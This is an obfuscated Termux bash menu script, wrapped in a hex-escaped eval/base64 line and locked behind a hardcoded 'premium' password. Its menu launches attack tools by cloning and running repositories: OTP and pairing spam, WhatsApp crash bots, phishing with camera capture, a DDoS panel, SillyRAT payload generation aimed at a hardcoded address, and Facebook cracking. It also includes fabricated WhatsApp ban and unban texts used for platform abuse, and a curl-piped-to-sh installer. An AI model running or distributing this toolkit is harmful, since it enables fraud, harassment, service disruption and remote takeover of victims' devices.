set +x;$'\x65\x76\x61\x6c' "$($'\x62\x61\x73\x65\x36\x34' $'\x2d\x64' <<< #!/bin/bash
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
mpv loading.mp3
clear
echo -e  "\033[35;1m╔════════════════════════════════════════════════════════╗"
echo -e  "\033[35;1m║ \033[31;1m • \033[33;1m AUTHOR CY78          \033[35;1m                              ║"
echo -e  "\033[35;1m║ \033[31;1m • \033[35;1m DILIRIS 2024-10-6 OKTIBER \033[35;1m                         ║"
echo -e  "\033[35;1m║ \033[35;1m • \033[32;1m ua_931                  \033[35;1m                           ║"
echo -e  "\033[35;1m║ \033[33;1m • \033[34;1m PREMIUM                \033[35;1m                            ║"
echo -e  "\033[35;1m╚════════════════════════════════════════════════════════╝"
verify_credentials() {
local expected_username="CY78"
local expected_password="🌷🌷🌷"
while true; do
read -p "Username: " username
read -s -p "Password: " password
echo
if [ "$username" == "$expected_username" ] && [ "$password" == "$expected_password" ]; then
echo "Login berhasil!"
break
else
echo "ANDA BELUM LANGGANAN  SILAKAN BELI KAKAK CANTIK "
fi
done
}
verify_credentials
sleep 2
clear
 xdg-open "https://www.tiktok.com/@kinghozooff?_t=8qNO3OFExSX&_r=1"
sleep 2
clear
mvp  BOT.mp3
read -h "ENTER LANJUTKAN ; " c
sleep 2
echo -e " \033[35;1m INSTALL MODULE PKG TERMUX"
mpv BOT.mp3
sleep 2
pkg install sox mpv -y
clear
slee 3
echo -e  "\033[35;1m╔════════════════════════════════════════════════════════╗"
echo -e  "\033[35;1m║ \033[31;1m • \033[33;1m AUTHOR CY78          \033[35;1m                              ║"
echo -e  "\033[35;1m║ \033[31;1m • \033[35;1m DILIRIS 2024-10-6 OKTIBER \033[35;1m                         ║"
echo -e  "\033[35;1m║ \033[35;1m • \033[32;1m ua_931                  \033[35;1m                           ║"
echo -e  "\033[35;1m║ \033[33;1m • \033[34;1m PREMIUM                \033[35;1m                            ║"
echo -e  "\033[35;1m╚════════════════════════════════════════════════════════╝"
read -h "ENTER MELANJUTKAN LAGI ?"
mpv BOT.mp3
sleep 2
clear
read -h " ENTER LANJUTKAN LAGI ? ; " c
clear
date
echo -e  "\033[35;1m╔════════════════════════════════════════════════════════╗"
echo -e  "\033[35;1m║ \033[31;1m • \033[33;1m AUTHOR CY78          \033[35;1m                              ║"
echo -e  "\033[35;1m║ \033[31;1m • \033[35;1m DILIRIS 2024-10-6 OKTIBER \033[35;1m                         ║"
echo -e  "\033[35;1m║ \033[35;1m • \033[32;1m ua_931                  \033[35;1m                           ║"
echo -e  "\033[35;1m║ \033[33;1m • \033[34;1m PREMIUM                \033[35;1m                            ║"
echo -e  "\033[35;1m╚════════════════════════════════════════════════════════╝"
echo -e  "\033[35;1m╔════════════════════════════════════════════════════════╗"$p
echo -e  "\033[35;1m║ \033[34;1m [01] \033[32;1m MENU SPAM PAIR DAN OTP                         \033[35;1m ║"
echo -e  "\033[35;1m║ \033[34;1m [02] \033[32;1m MENU BOT WHATS APP CRASH                       \033[35;1m ║"
echo -e  "\033[35;1m║ \033[34;1m [03] \033[32;1m MENU PHISING DAN CAMERA                     \033[35;1m    ║"
echo -e  "\033[35;1m║ \033[34;1m [04] \033[32;1m MENU TAMPILAN TERMUX KEREN                 \033[35;1m     ║"
echo -e  "\033[35;1m║ \033[34;1m [05] \033[32;1m MENU OSINT INSTRAGRAM                         \033[35;1m  ║"
echo -e  "\033[35;1m║ \033[34;1m [06] \033[32;1m MENU BOT APK BACKDOOR MENGABILKAN JPG    \033[35;1m       ║"
echo -e  "\033[35;1m║ \033[34;1m [07] \033[32;1m MENU DDOS HANYA UNTUK VPS DAN RDP              \033[35;1m ║"
echo -e  "\033[35;1m║ \033[34;1m [08] \033[32;1m MENU UNBANNED WHATS APP                     \033[35;1m    ║"
echo -e  "\033[35;1m║ \033[34;1m [09] \033[32;1m MENU BANNED WHATS APP                        \033[35;1m   ║"
echo -e  "\033[35;1m║ \033[34;1m [10] \033[32;1m MENU JARVIS                                  \033[35;1m   ║"
echo -e  "\033[35;1m║ \033[34;1m [11] \033[32;1m MENU DEFACE WEB JSON                         \033[35;1m   ║"
echo -e  "\033[35;1m║ \033[34;1m [12] \033[32;1m MENU TRACK IP                                 \033[35;1m  ║"
echo -e  "\033[35;1m║ \033[34;1m [13] \033[32;1m INSTALL LINUX ARM64 KHUSUS AMDROID 9 10 11   \033[35;1m   ║"
echo -e  "\033[35;1m║ \033[34;1m [14] \033[32;1m SIGNAL 9                                       \033[35;1m ║"
echo -e  "\033[35;1m║ \033[34;1m [15] \033[32;1m MENU CRACK FACEBOOK                          \033[35;1m   ║"
echo -e  "\033[35;1m║ \033[34;1m [16] \033[32;1m MENU FOLLOWERS TIKTOK                          \033[35;1m ║"
echo -e  "\033[35;1m║ \033[34;1m [17] \033[32;1m MENU OSINT                                     \033[35;1m ║"
echo -e  "\033[35;1m║ \033[34;1m [18] \033[32;1mINSTALL PKG DAN MODULE:                         \033[35;1m ║"
echo -e  "\033[35;1m╚════════════════════════════════════════════════════════╝"$p
echo -e  "\033[35;1m║"
echo -e  "\033[35;1m║"
echo -e  "\033[35;1m║"
read -p "╚════ROOT®KALI════> : " p
if [ $p == 1 ]
then
clear
mpv phonk.mp3
clear
mpv  open404.mp3
git clone https://github.com/Kingcy78/404
cd 404
bash 404.sh
fi
if [ $p == 2 ]
then
clear
mpv BOT.mp3
git clone https://github.com/Kingcy78/bot
cd bot
bash BOT-VIIP.sh
fi
if [ $p == 3 ]
then
clear
mpv kerjabagus.mp3
git clone https://github.com/Kingcy78/pising
cd pising
bash phising
fi 
if [ $p == 4 ]
then
clear
mpv phonk.mp3
pkg update && pkg upgrade 
pkg install python
pkg install python2
pkg install git
git clone https://github.com/Dra-ID/T4MPILAN-Style
cd T4MPILAN-Style
git pull
sh install.sh
fi
if [ $p == 5 ]
then
clear
mpv phonk.mp3
git clone https://github.com/Achik-Ahmed/IG-OSINT-V2
cd IG-OSINT-V2
pip install instaloader
python ig.py
fi
if [ $p == 6 ]
then
clear
mvp BOT1.mp3
sleep 2
echo "BUY ADMIN"
fi
if [ $p == 7 ]
then
mvp phonk.mp3
sleep 2
mpv BOT3.mp3
git clone https://github.com/dandiers/DdosPanel.git
cd DdosPanel
pip install -r requirements.txt
python3 main.py
fi
if [ $p == 8 ]
then
clear
mvp phonk.mp3
echo "Lum whatsapp, orang Jepang tak dikenal mengambil alih whatsapp saya, dia menggunakan whatsapp saya untuk menjual 172 video porno dan 13 anak kecil untuk dijual dan diperkosa oleh pembeli, dia juga mengancam saya jika saya tidak memberikan whatsapp saya keluarga saya akan dibunuh dan kakak saya akan mencoba, awalnya saya tidak percaya tetapi Dia tahu rumah keluarga saya dan setelah pria Jepang itu menggunakan whatsapp saya dan saya akan menggunakan whatsapp saya nomor whatsapp saya diblokir setelah itu baca artikel di whatsapp tentang memperlakukan orang Jepang laki-laki itu melanggar ketentuan layanan yang ditemukan di whatsapp setelah saya menggunakan whatsapp pribadi saya. Saya benar-benar memohon kepada whatsapp untuk membatalkan pemblokiran whatsapp saya dan memulihkan akun whatsapp saya terima kasih nomor whatsapp saya +62"
fi
if [ $p == 9 ]
then
clear
mvp phonk.mp3
sleep 2
mpv open404.mp3
echo "Здравствуйте, один из разработчиков WhatsApp работает над получением дополнительного дохода в размере 1,01 доллара.
Разделите безумие и заработайте $ 1,22_ $ 5,22, используя платформу онлайн-покупок.
Нажмите кнопку вызова внизу на 1 секунду.
Пожалуйста, сначала
 Введите следующую контактную информацию в течение [2] секунд, чтобы связаться с менеджером и выиграть 0,1.2$!👇👇
https://api.whatsapp.com/отправить
?Телефон=+62"
fi
if [ $p == 11 ]
then
clear
mvp phonk.mp3
git clone https://github.com/hash3liZer/SillyRAT.git
cd SillyRAT/
pip3 install -r requirements.txt
python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source
fi
if [ $p == 12 ]
then
clear
mpv phonk.mp3
apt update ; apt install git curl -y ; git clone git://github.com/htr-tech/track-ip.git ; cd track-ip ; bash trackip
fi
if [ $p == 13 ]
then
clear
mpv phonk.mp3
sleep 2
mpv open404.mp3
termux-setup-storage
apt update ; apt install curl -y ; curl https://raw.githubusercontent.com/xiv3r/Kali-Linux-Termux/refs/heads/main/install.sh | sh
./install-nethunter-termux
fi
if [ $p == 14 ]
then
clear
mpv phonk.mp3
sleep 2
mpv open404.mp3
adb shell "/system/bin/dumpsys activity settings | grep max_phantom_processes"
adb shell "/system/bin/dumpsys activity processes -a"
adb shell "/system/bin/device_config set_sync_disabled_for_tests persistent"
adb shell "/system/bin/device_config put activity_manager max_phantom_processes 2147483647"
adb shell settings put global settings_enable_monitor_phantom_procs false
fi
if [ $p == 15 ]
then
clear
mpv phonk.mp3
pkg install git -y
pkg install python -y
git clone https://github.com/7wp81x/FBGen.git
cd FBGen
python fbgen.py
fi
if [ $p == 16 ]
then
clear
mpv phonk.mp3
pkg install php -y 
git clone https://github.com/Kingcy78/H20
cd H20
php bot.php
fi
if [ $p == 17 ]
then
clear
mpv phonk.mp3
sleep 2
cd $HOME
git clone https://github.com/TermuxHackz/X-osint
cd X-osint
chmod +x *
bash setup.sh
fi
if [ $p == 18 ]
then
clear
mpv phonk.mp3
sleep 2
mpv open404.mp3
pkg install php -y
pkg install nala -y
nala install git bash -y
nala install sox mpv -y
nala install cowsay ruby -y
nala install binutils zip unzip -y
gem install lolcat
apt install php -y
apt install python -y
apt install python2 -y
apt install python3 -y
apt install nano -y
apt install toilet -y
apt install figlet -y
apt install wget -y
apt install wcalc -y 
apt install nmap -y
apt install curl -y
apt install bmon -y
apt install apache2 -y
apt install ruby -y
apt install tor -y
apt install openssl -y
apt install macchanger -y
apt install install perl -y
apt install unzip -y
pip install -r tambahanmodule.txt
pip install colorama -y
pip install requests -y
pkg install python-numpy -y
pkg install electrum -y
pkg install opencv-python -y
pkg install asciinema -y
pkg install matplotlib -y
pkg install python-cryptography -y
pkg install python-tkinter -y
pkg install python -y
pkg install python2 -y
fi
)"
